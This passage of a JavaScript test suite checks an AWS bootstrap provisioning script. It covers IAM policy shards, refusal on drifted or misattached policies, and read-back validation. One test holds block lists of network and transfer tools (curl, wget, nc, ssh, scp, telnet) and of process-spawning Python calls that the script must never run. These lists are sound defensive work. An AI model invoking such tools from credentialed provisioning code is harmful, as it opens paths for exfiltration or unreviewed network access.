    const r = run('dev', phase, scen);
    assert.notEqual(r.code, 0, JSON.stringify(scen));
    assert.match(r.out, /not a proven absence/, JSON.stringify(scen));
    assert.deepEqual(r.mutations, [], 'zero mutation');
  }
});

test('EXECUTED closed CLI: no combined mode, no default, no third argument', () => {
  for (const entry of [LAUNCHER, SCRIPT]) {
    for (const args of [['dev'], ['dev', 'all'], ['dev', ''], ['staging', 'policies'], ['dev', 'policies', 'bootstrap']]) {
      let code = 0; let out = '';
      try {
        out = execFileSync('bash', [entry, ...args], { encoding: 'utf8', env: { PATH: process.env.PATH } });
      } catch (e) { out = `${e.stdout ?? ''}${e.stderr ?? ''}`; code = e.status ?? 1; }
      assert.notEqual(code, 0, `${entry} ${JSON.stringify(args)}`);
      assert.match(out, /usage:|REFUSED/, `${entry} ${JSON.stringify(args)}`);
    }
  }
});

test('r5-F3: the DEADLINE SCOPE is exactly what the contract claims — a closed, pinned exception set', () => {
  // The claim is narrow and provable: everything that reaches the network or carries credentials
  // goes through the bounded runner; the only unwrapped children are local text utilities on
  // files the script itself created. This test pins BOTH halves.
  const body = fs.readFileSync(SCRIPT, 'utf8');
  const code = body.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');

  // 1. NOTHING that reaches the network may be INVOKED, wrapped or not. The match is at command
  //    position — the word may still appear inside a message, which is prose, not a call.
  for (const forbidden of ['npx', 'cdk', 'node', 'curl', 'wget', 'nc', 'ssh', 'git']) {
    const atCommandPosition = new RegExp(`(?:^\\s*|[;&|(]\\s*|\\$\\(\\s*|\\bexec\\s+)${forbidden}\\s`, 'm');
    assert.equal(atCommandPosition.test(code), false, `${forbidden} must not be invoked by the provisioning script`);
  }
  // 2. Every `aws` invocation is a bounded one: either through aws_() or an explicit
  //    bounded-run.py line (the two mutation calls).
  const awsLines = code.split('\n').filter((l) => /(^|[;&|(]\s*|\s)aws\s/.test(l));
  for (const line of awsLines) {
    assert.ok(
      /aws_\(\)/.test(line) || /bounded-run|python3 "\$BOUNDED"/.test(line) || /--cli-connect-timeout/.test(line),
      `unbounded aws invocation: ${line.trim()}`,
    );
  }
  // 3. Every python3 invocation is either bounded or one of the PINNED inline parsers, which
  //    read only local strings/files this script produced.
  const pyLines = code.split('\n').filter((l) => /python3/.test(l));
  const INLINE_PARSERS = ['canon()', 'same_doc()', 'jqpy()', 'pyq()'];
  for (const line of pyLines) {
    const bounded = /\$BOUNDED/.test(line) || /^\s*run_\s/.test(line);
    const inline = INLINE_PARSERS.some((p) => line.includes(p)) || /python3 (-I )?-c/.test(line);
    assert.ok(bounded || inline, `python3 call is neither bounded nor a pinned inline parser: ${line.trim()}`);
  }
  // 4. BIDIRECTIONAL, STRUCTURAL inventory (r6-F3). A real shell lexer — statement boundaries and
  //    `$( )` bodies included — lists every external program the script EXECUTES DIRECTLY. The
  //    declared set and that inventory must be equal in both directions: an undeclared command
  //    fails, and a declared-but-unused one fails too, so the header cannot drift from the code.
  //    `aws` and `git` are absent by construction — they only ever run as ARGUMENTS to the
  //    bounded runner and to `timeout`, which checks 2 and 6 pin separately.
  const declared = body.match(/can execute are exactly\s*#?\s*\(([^)]+)\)/);
  assert.ok(declared, 'the script must enumerate the external programs it executes directly');
  const DECLARED = declared[1].split('/').map((s) => s.trim()).sort();
  const inventory = execFileSync('python3', [path.join(ROOT, 'test/lib/shell-command-inventory.py'), SCRIPT], { encoding: 'utf8' })
    .split('\n').filter(Boolean).sort();
  assert.deepEqual(inventory, DECLARED,
    'the external-command inventory and the declared set must agree exactly — in both directions');

  // 4b. The inline Python bodies are outside the SHELL inventory's reach by nature, so they are
  //     pinned directly: no interpreter body may spawn a process (r8-F1's stated boundary).
  for (const m of code.matchAll(/python3 -I -c ('|")([\s\S]*?)\1/g)) {
    for (const forbidden of ['subprocess', 'os.system', 'os.popen', 'os.exec', 'pty.spawn', '__import__']) {
      assert.equal(m[2].includes(forbidden), false, `an inline Python body must not use ${forbidden}`);
    }
  }

  // 5. And no OTHER interpreter or transfer tool may be invoked, however it is spelled.
  for (const forbidden of ['scp', 'rsync', 'docker', 'kubectl', 'perl', 'ruby', 'php', 'telnet', 'ftp']) {
    assert.equal(inventory.includes(forbidden), false, `${forbidden} must not be invoked by the provisioning script`);
  }

  // 6. The LAUNCHER gets the same treatment, with its own declared set.
  const launcherBody = fs.readFileSync(LAUNCHER, 'utf8');
  const launcherInventory = execFileSync('python3', [path.join(ROOT, 'test/lib/shell-command-inventory.py'), LAUNCHER], { encoding: 'utf8' })
    .split('\n').filter(Boolean).sort();
  assert.deepEqual(launcherInventory, ['bash', 'cat', 'chmod', 'env', 'find', 'git', 'grep', 'mktemp', 'rm', 'sha256sum', 'sort', 'tar', 'timeout', 'xargs'],
    'the launcher executes exactly these programs — a change is a review event');
  assert.match(launcherBody, /timeout --kill-after=5 "\$GIT_T" git/, 'every git call in the launcher is deadline-bounded');
  assert.equal(/(?:^|[;&|(]\s*|\$\(\s*)git\s/m.test(launcherBody.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n')), false,
    'the launcher never calls git outside the bounded wrapper');

  // 7. Every Python entry is ISOLATED (r6-F4): no PYTHONPATH/sitecustomize can inject code.
  for (const line of code.split('\n').filter((l) => /python3/.test(l))) {
    assert.match(line, /python3 -I\b/, `python3 must run isolated: ${line.trim()}`);
  }
});

/* ═══════════ THE EXECUTION POLICY SHARDS (#111 r11) ═══════════ */

// IAM caps a managed policy at 6.144 characters and the reviewed execution document measures
// 10.265, so a single policy was never creatable — the create failed and the phase recorded the
// partial state honestly. The canonical file stays in the tree as the SEMANTIC CONTRACT and is
// never deployed; these tests are what keep the three shards faithful to it.

const CANONICAL_EXEC = path.join(ROOT, 'infra/aws/bootstrap/policies/cfn-exec-release.template.json');
const SHARD_FILE = (name) => path.join(ROOT, `infra/aws/bootstrap/policies/cfn-exec-release-${name}.template.json`);
const IAM_POLICY_LIMIT = 6144;
const SHARD_BUDGET = 5500;

// The APPROVED partition, by Sid. Declared here so the split itself is reviewable, and compared
// against the files: a statement that moves, duplicates or disappears fails.
const APPROVED_PARTITION = {
  app: ['ReadReleaseBootstrapVersionParameter', 'ReadReleaseAssetsFromBootstrapBucket',
    'LambdaLifecycleOnOwnFunctions', 'ApiGatewayV2CreateOnlyProjectTaggedApis',
    'ApiGatewayV2RootLifecycleOnlyOnProjectTaggedApis', 'ApiGatewayV2ChildLifecycleOnlyOnProjectTaggedApis',
    'ApiGatewayV2TagReadAndWriteOnlyOnOwnedResources', 'DynamoLifecycleOnOwnTables',
    'CognitoCreateOnlyProjectTaggedPools', 'CognitoLifecycleOnlyOnProjectTaggedPools'],
  platform: ['CloudWatchAlarmsOnOwnNames', 'CloudWatchDashboardsOnOwnNames',
    'LogsLifecycleOnOwnGroups', 'LogsQueryDefinitionsCarryNoScopingArn', 'SnsLifecycleOnOwnTopics',
    'KmsCreateOnlyProjectTaggedKeys', 'KmsKeyLifecycleOnlyOnProjectTaggedKeys', 'KmsAliasesOnOwnNames',
    'CreateRuntimeRolesOnlyWithPinnedBoundary', 'RuntimeRoleLifecycleOnOwnNames',
    'AttachOnlyTheLambdaBasicExecutionManagedPolicy', 'PassRuntimeRolesToLambdaOnly'],
  guardrails: ['DenyGovernanceTagRemoval', 'DenyProjectTagReplacement', 'DenyEnvironmentTagReplacement',
    'DenyGovernanceTagRemovalOnTagScopedFamilies', 'DenyProjectTagReplacementOnTagScopedFamilies',
    'DenyEnvironmentTagReplacementOnTagScopedFamilies', 'DenyTouchingGithubAndFoundationRoles',
    'DenyBoundaryDetachOrSwapOnRuntimeRoles', 'DenyRuntimeBoundaryPolicyMutation'],
};

const canonicalStatements = () => JSON.parse(fs.readFileSync(CANONICAL_EXEC, 'utf8')).Statement;
const shardDoc = (name) => JSON.parse(fs.readFileSync(SHARD_FILE(name), 'utf8'));
const renderedSize = (text) => text
  .replaceAll('ACCOUNT_ID_PLACEHOLDER', ACCOUNT).replaceAll('ENVIRONMENT_PLACEHOLDER', 'dev')
  .replaceAll('QUALIFIER_PLACEHOLDER', 'cbardev')
  .replace(/\s/g, '').length;

test('r11: the canonical execution document CANNOT be a single managed policy — that is why it is sharded', () => {
  const size = renderedSize(fs.readFileSync(CANONICAL_EXEC, 'utf8'));
  assert.ok(size > IAM_POLICY_LIMIT,
    `the canonical document is ${size} chars; if it ever fits in ${IAM_POLICY_LIMIT} the split should be revisited through review`);
});

test('r11: every canonical statement appears EXACTLY ONCE across the three shards, unchanged', () => {
  const canonical = canonicalStatements();
  const bySid = new Map(canonical.map((s) => [s.Sid, s]));
  assert.equal(bySid.size, canonical.length, 'every canonical statement carries a distinct Sid');

  const placed = Object.values(APPROVED_PARTITION).flat();
  assert.equal(placed.length, canonical.length, 'the partition covers every statement');
  assert.equal(new Set(placed).size, placed.length, 'no statement is placed twice');
  assert.deepEqual([...placed].sort(), [...bySid.keys()].sort(), 'the partition names exactly the canonical Sids');

  for (const [name, sids] of Object.entries(APPROVED_PARTITION)) {
    const doc = shardDoc(name);
    assert.equal(doc.Version, JSON.parse(fs.readFileSync(CANONICAL_EXEC, 'utf8')).Version, `${name}: same policy language version`);
    assert.deepEqual(doc.Statement.map((s) => s.Sid), sids, `${name}: statements in the declared order`);
    // UNCHANGED, byte for byte after canonical JSON: this is what makes the shards faithful.
    for (const s of doc.Statement) {
      assert.deepEqual(s, bySid.get(s.Sid), `${name}: statement ${s.Sid} was modified`);
    }
  }
});

test('r11: app and platform carry ONLY Allow; guardrails carries ONLY Deny', () => {
  for (const name of ['app', 'platform']) {
    for (const s of shardDoc(name).Statement) {
      assert.equal(s.Effect, 'Allow', `${name}: ${s.Sid} is not an Allow`);
    }
  }
  const denies = shardDoc('guardrails').Statement;
  for (const s of denies) assert.equal(s.Effect, 'Deny', `guardrails: ${s.Sid} is not a Deny`);
  // And guardrails holds ALL of them: a Deny that escaped into another shard would still apply,
  // but the split would stop being reviewable as "every prohibition in one place".
  const canonicalDenies = canonicalStatements().filter((s) => s.Effect === 'Deny').map((s) => s.Sid).sort();
  assert.deepEqual(denies.map((s) => s.Sid).sort(), canonicalDenies);
});

test('r11: every shard fits the IAM limit with room to spare, in BOTH tiers', () => {
  for (const [env, qualifier] of [['dev', 'cbardev'], ['pilot', 'cbarpil']]) {
    for (const name of Object.keys(APPROVED_PARTITION)) {
      const size = fs.readFileSync(SHARD_FILE(name), 'utf8')
        .replaceAll('ACCOUNT_ID_PLACEHOLDER', ACCOUNT).replaceAll('ENVIRONMENT_PLACEHOLDER', env)
        .replaceAll('QUALIFIER_PLACEHOLDER', qualifier)
        .replace(/\s/g, '').length;
      assert.ok(size <= IAM_POLICY_LIMIT, `${env}/${name}: ${size} exceeds the IAM hard limit ${IAM_POLICY_LIMIT}`);
      assert.ok(size <= SHARD_BUDGET, `${env}/${name}: ${size} exceeds the reviewed budget ${SHARD_BUDGET}`);
    }
  }
});

test('r11 REVERSAL PROOF: dropping a statement or a whole shard turns the partition red', () => {
  // The guarantee is only worth what its failure mode proves. Both mutations are in memory.
  const canonical = canonicalStatements();
  const bySid = new Map(canonical.map((s) => [s.Sid, s]));

  // (a) a statement removed from a shard: coverage breaks.
  const short = { ...APPROVED_PARTITION, app: APPROVED_PARTITION.app.slice(1) };
  const placedShort = Object.values(short).flat();
  assert.notEqual(placedShort.length, canonical.length, 'a missing statement must be observable');

  // (b) a statement duplicated across two shards: the set still covers, the multiset does not.
  const dup = { ...APPROVED_PARTITION, platform: [...APPROVED_PARTITION.platform, APPROVED_PARTITION.app[0]] };
  const placedDup = Object.values(dup).flat();
  assert.notEqual(new Set(placedDup).size, placedDup.length, 'a duplicated statement must be observable');

  // (c) a statement altered inside a shard: the byte-for-byte comparison catches it.
  const tampered = JSON.parse(JSON.stringify(bySid.get(APPROVED_PARTITION.app[0])));
  tampered.Resource = '*';
  assert.notDeepEqual(tampered, bySid.get(APPROVED_PARTITION.app[0]), 'an altered statement must differ');

  // (d) an entire shard missing: the file read itself fails.
  assert.throws(() => fs.readFileSync(SHARD_FILE('does-not-exist'), 'utf8'));
});

for (const env of ['dev', 'pilot']) {
  test(`EXECUTED r11 (${env}): the LEGACY singular policy blocks BOTH phases until it is migrated`, () => {
    for (const phase of ['policies', 'bootstrap']) {
      const r = run(env, phase, { legacyExists: true });
      assert.notEqual(r.code, 0, `${phase}: must refuse`);
      assert.match(r.out, /legacy singular policy .* still exists/);
      assert.deepEqual(r.mutations, [], `${phase}: zero mutation`);
    }
  });

  test(`EXECUTED r11 (${env}): a MISSING, EXTRA or DIVERGENT shard refuses with zero mutation`, () => {
    const names = ENVS[env].execNames;
    const divergent = { Version: '2012-10-17', Statement: [{ Sid: 'Widened', Effect: 'Allow', Action: '*', Resource: '*' }] };
    // missing: the bootstrap phase requires all five present
    const missing = run(env, 'bootstrap', { policyAbsent: [names[1]] });
    assert.notEqual(missing.code, 0);
    assert.match(missing.out, /is absent — run the 'policies' phase/);
    assert.deepEqual(missing.mutations, []);
    // divergent: any shard whose document drifted
    for (const n of names) {
      const r = run(env, 'policies', { policyDocs: { [n]: divergent } });
      assert.notEqual(r.code, 0, n);
      assert.match(r.out, /diverges from the reviewed template/, n);
      assert.deepEqual(r.mutations, [], n);
    }
    // extra consumer: a shard attached beyond the execution role
    const extra = run(env, 'policies', { entitiesOverride: { [`${names[0]}|PermissionsPolicy`]: ['intruder-role'] } });
    assert.notEqual(extra.code, 0);
    assert.match(extra.out, /attached beyond the expected execution role/);
    assert.deepEqual(extra.mutations, []);
  });

  test(`EXECUTED r11 (${env}): a shard used as a BOUNDARY, or CROSS-TIER, refuses`, () => {
    const names = ENVS[env].execNames;
    const other = env === 'dev' ? 'pilot' : 'dev';
    const asBoundary = run(env, 'policies', { entitiesOverride: { [`${names[2]}|PermissionsBoundary`]: ['some-role'] } });
    assert.notEqual(asBoundary.code, 0);
    assert.match(asBoundary.out, /used as a permissions boundary/);
    assert.deepEqual(asBoundary.mutations, []);

    const crossTier = run(env, 'policies', {
      entitiesOverride: { [`${names[0]}|PermissionsPolicy`]: [`cdk-${other === 'dev' ? 'cbardev' : 'cbarpil'}-cfn-exec-role-${ACCOUNT}-us-east-1`] },
    });
    assert.notEqual(crossTier.code, 0);
    assert.match(crossTier.out, /attached beyond the expected execution role/);
    assert.deepEqual(crossTier.mutations, []);
  });

  test(`EXECUTED r11 (${env}): the toolkit receives EXACTLY the three shard ARNs, in order`, () => {
    const r = run(env, 'bootstrap', { stackExists: false });
    assert.equal(r.code, 0, r.out);
    const value = paramsOf(r).find((x) => x.ParameterKey === 'CloudFormationExecutionPolicies').ParameterValue;
    assert.deepEqual(value.split(','), ENVS[env].execArns, 'the three ARNs, in the reviewed order');
    assert.equal(value.split(',').length, 3);
  });
}

test('EXECUTED r12-F1: a boundary use introduced DURING the bootstrap is caught by the read-back', () => {
  // The precondition pass sees a clean policy; the usage appears only after create-stack. Before
  // r12 the final read-back queried PermissionsPolicy alone, so this reached READ-BACK OK.
  const name = ENVS.dev.execNames[1];
  const r = run('dev', 'bootstrap', { stackExists: false, boundaryAfterCreate: name });
  assert.notEqual(r.code, 0);
  assert.match(r.out, /used as a permissions BOUNDARY/);
  assert.ok(!r.out.includes('READ-BACK OK'), 'a shard that also bounds a principal never reads back OK');
  // The mutation DID happen — this is a post-mutation refusal, and the message must not pretend
  // otherwise; what it proves is that the run cannot end in a false OK.
  assert.equal(r.mutations.filter((m) => m.startsWith('create-stack')).length, 1);
});

test('r12-F2: the resolver and the read-back BOTH refuse an ARN set that is not the reviewed one', () => {
  // Same closed set, derived independently in each validator: name, account, shape and ORDER.
  const tool = path.join(ROOT, 'scripts/lib/bootstrap-expected-state.py');
  const good = ENVS.dev.execArns;
  const cases = [
    ['estrangeiros', [0, 1, 2].map((i) => `arn:aws:iam::${ACCOUNT}:policy/foreign-${i}`)],
    ['ordem trocada', [good[1], good[0], good[2]]],
    ['conta errada', good.map((a) => a.replace(ACCOUNT, '999988887777'))],
    ['tier errado', good.map((a) => a.replace('-dev-', '-pilot-'))],
    ['formato errado', good.map((a) => a.replace('arn:aws:iam::', 'arn:aws:iam:'))],
  ];
  for (const [label, arns] of cases) {
    assert.throws(
      () => execFileSync('python3', [tool, SNAPSHOT, ACCOUNT, REGION, 'cbardev', arns.join(','), '/dev/null'], { encoding: 'utf8', stdio: 'pipe' }),
      /not exactly the reviewed set|REFUSED/,
      `o resolver deve recusar: ${label}`,
    );
  }
  // And the SECOND validator is EXECUTED with the same invalid sets — searching its source for
  // literals would have been satisfied by a no-op that kept the strings (r13). The observation
  // directory deliberately does not exist: with the guard in place the run refuses on the ARNs
  // before reading anything, and if the guard were ever removed the failure would become a
  // missing-file error and this regression would go red.
  const readback = path.join(ROOT, 'scripts/lib/bootstrap-readback-validate.py');
  const nowhere = path.join(os.tmpdir(), `cba-no-such-dir-${process.pid}`);
  assert.equal(fs.existsSync(nowhere), false, 'the observation directory must not exist');
  for (const [label, arns] of cases) {
    let out = ''; let code = 0;
    try {
      out = execFileSync('python3', [readback, nowhere, 'cbardev', ACCOUNT, arns.join(','), 'cba-release-toolkit-dev'],
        { encoding: 'utf8', stdio: 'pipe' });
    } catch (e) { out = `${e.stdout ?? ''}${e.stderr ?? ''}`; code = e.status ?? 1; }
    assert.notEqual(code, 0, `o read-back deve recusar: ${label}`);
    assert.match(out, /the ARNs are not exactly the reviewed set, in order/, `mensagem especifica para: ${label}`);
  }
});

/* ═══════════ THE OBSERVATION CLASSIFICATION (#111 r14) ═══════════ */

// The live gate-2 run created the toolkit correctly and then the READ-BACK crashed: a stack with
// no stack policy makes `get-stack-policy` return the documented null value, which the CLI
// serializes as ZERO BYTES, and a bare `json.load` blew up on it. The fake had modelled `{}`.
// The fix is one dedicated loader for that ONE call — not tolerance everywhere, because for every
// other observation an empty body is a LOST observation, not an absence.

test('r14/r15: ZERO BYTES is the documented absence — and only zero bytes', () => {
  const r = run('dev', 'bootstrap', {});           // the default fake writes nothing at all
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /READ-BACK OK/);
  // The distinction that matters: an explicitly empty string is still zero bytes and passes,
  // while any body with content — even a single line break — does not (cases above).
  const explicit = run('dev', 'bootstrap', { stackPolicyRaw: '' });
  assert.equal(explicit.code, 0, explicit.out);
  assert.match(explicit.out, /READ-BACK OK/);
});

test('r14: a stack policy that IS present still refuses', () => {
  const r = run('dev', 'bootstrap', { stackPolicy: true });
  assert.notEqual(r.code, 0);
  assert.match(r.out, /unexpected stack policy/);
});

test('r14/r15: every ambiguous stack-policy body refuses BY NAME', () => {
  // r15: the newline-only bodies are the ones command substitution used to erase. `"   \n"`
  // keeps its spaces and reaches the loader; `"\n"` and `"\n\n"` collapse to the empty string
  // and must be caught on the RAW FILE, before the exception can read them as an absence.
  const cases = [
    ['newline only', '\n', /carries only line breaks/],
    ['duas newlines', '\n\n', /carries only line breaks/],
    ['whitespace only', '   \n', /whitespace only/],
    ['JSON malformado', '{"StackPolicyBody":', /not valid JSON/],
    ['topo nao-objeto', '["StackPolicyBody"]', /not a JSON object/],
    ['chave desconhecida', '{"SomethingElse":"x"}', /unknown key/],
  ];
  for (const [label, body, re] of cases) {
    const r = run('dev', 'bootstrap', { stackPolicyRaw: body });
    assert.notEqual(r.code, 0, label);
    assert.match(r.out, re, label);
    assert.ok(!r.out.includes('READ-BACK OK'), `${label}: nunca conclui OK`);
  }
});

test('r14: a NULL StackPolicyBody is an absence, not a policy', () => {
  const r = run('dev', 'bootstrap', { stackPolicyRaw: '{"StackPolicyBody": null}' });
  assert.equal(r.code, 0, r.out);
  assert.match(r.out, /READ-BACK OK/);
});

test('r14: for every OTHER observation, an empty body is a LOST observation and refuses', () => {
  // The snapshot requires each of these resources, so absence is divergence. Their APIs signal a
  // real absence with a named error (NoSuchBucketPolicy, NoSuchLifecycleConfiguration,
  // LifecyclePolicyNotFoundException, RepositoryPolicyNotFoundException), which `observe()`
  // already refuses — an EMPTY success body is the case this pins.
  const mustBePresent = [
    's3api get-bucket-policy',
    's3api get-bucket-lifecycle-configuration',
    'ecr get-lifecycle-policy',
    'ecr get-repository-policy',
    'cloudformation get-template',
    'iam list-entities-for-policy',
  ];
  for (const sub of mustBePresent) {
    const r = run('dev', 'bootstrap', { emptyObs: sub });
    assert.notEqual(r.code, 0, sub);
    assert.match(r.out, /came back EMPTY — a body was required|is empty — this API must return a body/, sub);
    assert.ok(!r.out.includes('READ-BACK OK'), `${sub}: nunca conclui OK`);
  }
});

test('r14: the permissive loader has EXACTLY ONE call site; everything else stays strict', () => {
  const src = fs.readFileSync(path.join(ROOT, 'scripts/lib/bootstrap-readback-validate.py'), 'utf8');
  const defs = src.match(/^def load_stack_policy\(\):/gm) ?? [];
  assert.equal(defs.length, 1, 'exactly one definition');
  const calls = src.match(/load_stack_policy\(\)/g) ?? [];
  assert.equal(calls.length, 2, 'the definition plus exactly ONE call site');
  // And every other observation goes through the strict loader.
  const strictCalls = src.match(/\bload\('obs\.[a-z0-9.$-]+/g) ?? [];
  assert.ok(strictCalls.length >= 10, `the strict loader still reads the other observations: ${strictCalls.length}`);
  assert.equal(/load\('obs\.stackpolicy/.test(src), false, 'the stack policy never goes through the strict loader');
});

/* ═══════════ THE API SHAPES THE READ-BACK MUST EXPECT (#111 r16) ═══════════ */

// The first reentrant read-back against the REAL toolkit refused with six divergences, and all
// six were AWS normalizations rather than drift: IAM and KMS return a document stored without a
// `Version` carrying "2008-10-17", and S3 returns lifecycle rules with `ID` plus a materialized
// `Filter: {"Prefix": ""}`. The model now says what the API RETURNS — and still refuses anything
// else, which is what these tests pin.

test('r16: documents WITHOUT a template Version are modelled as the API returns them', () => {
  const m = ENVS.dev.model;
  // Observed live: these four trust documents and the KMS key policy carry 2008-10-17…
  for (const lid of ['FilePublishingRole', 'ImagePublishingRole', 'LookupRole', 'DeploymentActionRole']) {
    assert.equal(m.roles[lid].trust.Version, '2008-10-17', `${lid}: implicit policy version`);
  }
  assert.equal(m.kms.keyPolicy.Version, '2008-10-17');
  // …while a document that DECLARES 2012-10-17 keeps it. This is the control that shows the
  // rule is "fill in the implicit version", not "ignore versions".
  assert.equal(m.roles.CloudFormationExecutionRole.trust.Version, '2012-10-17');
  assert.equal(m.bucket.policy.Version, '2012-10-17');
  assert.equal(m.ecr.policy.Version, '2012-10-17');
});

test('r16: a trust document coming back with a DIFFERENT version still refuses', () => {
  const r = run('dev', 'bootstrap', { trustVersionOverride: '2012-10-17' });
  assert.notEqual(r.code, 0);
  assert.match(r.out, /the trust document diverges from the template/);
  assert.ok(!r.out.includes('READ-BACK OK'));
});

test('r16: lifecycle rules are modelled in the S3 API shape — ID and the materialized filter', () => {
  const rules = ENVS.dev.model.bucket.lifecycle;
  assert.equal(rules.length, 2);
  for (const rule of rules) {
    assert.ok(rule.ID, 'the API returns ID, not the CloudFormation property Id');
    assert.equal(rule.Id, undefined);
    assert.deepEqual(rule.Filter, { Prefix: '' }, 'S3 materializes an empty filter');
  }
  assert.deepEqual(rules.map((r) => r.ID), ['CleanupOldVersions', 'AbortIncompleteMultipartUploads']);
});

test('r16: a lifecycle rule with a REAL prefix or an extra rule still refuses', () => {
  const base = ENVS.dev.model.bucket.lifecycle;
  const cases = [
    ['prefixo real', base.map((r, i) => (i === 0 ? { ...r, Filter: { Prefix: 'assets/' } } : r))],
    ['regra destrutiva extra', [...base, { ID: 'ExpireEverything', Status: 'Enabled', Filter: { Prefix: '' }, Expiration: { Days: 1 } }]],
    ['regra desabilitada', base.map((r, i) => (i === 0 ? { ...r, Status: 'Disabled' } : r))],
  ];
  for (const [label, lifecycleOverride] of cases) {
    const r = run('dev', 'bootstrap', { lifecycleOverride });
    assert.notEqual(r.code, 0, label);
    assert.match(r.out, /lifecycle configuration diverges/, label);
    assert.ok(!r.out.includes('READ-BACK OK'), label);
  }
});

test('r16: an UNMODELLED lifecycle shape in the template refuses the snapshot outright', () => {
  // If the reviewed template ever declares a Filter or a Prefix, the API shape for it is a
  // guess — and guessing is what this validator must never do.
  const tool = path.join(ROOT, 'scripts/lib/bootstrap-expected-state.py');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cba-lc-'));
  try {
    const tpl = fs.readFileSync(SNAPSHOT, 'utf8')
      .replace('          - Id: CleanupOldVersions', '          - Id: CleanupOldVersions\n            Prefix: assets/');
    const p = path.join(dir, 'tampered.yaml');
    fs.writeFileSync(p, tpl);
    const phys = path.join(dir, 'phys.json');
    fs.writeFileSync(phys, JSON.stringify({ FileAssetsBucketEncryptionKey: KEY_ID }));
    assert.throws(
      () => execFileSync('python3', [tool, p, ACCOUNT, REGION, 'cbardev', ENVS.dev.execArns.join(','), phys], { encoding: 'utf8', stdio: 'pipe' }),
      /unmodelled|REFUSED/,
    );
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});
